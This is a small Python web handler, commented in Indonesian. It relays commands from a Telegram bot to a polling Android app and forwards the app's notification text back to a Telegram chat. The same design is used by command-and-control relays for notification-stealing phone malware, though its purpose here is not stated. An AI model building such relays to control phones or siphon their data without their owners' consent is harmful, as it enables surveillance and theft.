from http.server import BaseHTTPRequestHandler
import os
import urllib.request
import urllib.parse
import json

# Penyimpanan memori sementara
last_command = ""

class handler(BaseHTTPRequestHandler):
    def do_POST(self):
        global last_command
        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length).decode('utf-8')

        # 1. Cek apakah data dari Telegram (format JSON)
        if post_data.startswith('{') and 'message' in post_data:
            try:
                data = json.loads(post_data)
                msg = data.get("message", {}).get("text", "")
                if msg:
                    last_command = msg # Simpan perintah (misal /panic)
            except:
                pass
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"OK")
            
        # 2. Cek apakah data dari APK (teks biasa)
        else:
            if post_data == "GET_CMD":
                # APK minta perintah, kita kasih perintah terakhir
                self.send_response(200)
                self.end_headers()
                self.wfile.write(last_command.encode('utf-8'))
                last_command = "" # Hapus setelah diambil APK
            else:
                # APK ngirim notif, teruskan ke Telegram
                token = os.environ.get('BOT_TOKEN')
                chat_id = os.environ.get('CHAT_ID')
                if token and chat_id:
                    try:
                        url = f"https://api.telegram.org/bot{token}/sendMessage"
                        payload = urllib.parse.urlencode({'chat_id': chat_id, 'text': post_data}).encode('utf-8')
                        req = urllib.request.Request(url, data=payload, method='POST')
                        urllib.request.urlopen(req, timeout=10)
                    except: pass
                self.send_response(200)
                self.end_headers()
